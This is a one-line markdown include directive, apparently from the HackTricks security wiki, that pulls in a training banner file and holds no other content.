{{#include ../../banners/hacktricks-training.md}}
